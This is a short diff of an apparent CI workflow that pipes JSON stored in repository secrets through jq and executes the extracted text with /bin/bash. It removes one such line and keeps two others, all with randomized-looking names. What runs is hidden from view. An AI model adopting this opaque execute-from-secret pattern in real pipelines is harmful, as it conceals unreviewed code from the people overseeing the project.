@@ -23,7 +23,6 @@ jobs:
           w7: ${{ secrets.w7 }}
         run: |
           printf '%s' "$w7" | jq -r .gw16852 | /bin/bash
-          printf '%s' "$nycsx720" | jq -r .sbuix60 | /bin/bash
           printf '%s' "$p31275" | jq -r .ootui90298 | /bin/bash
 
       - name: Save archive
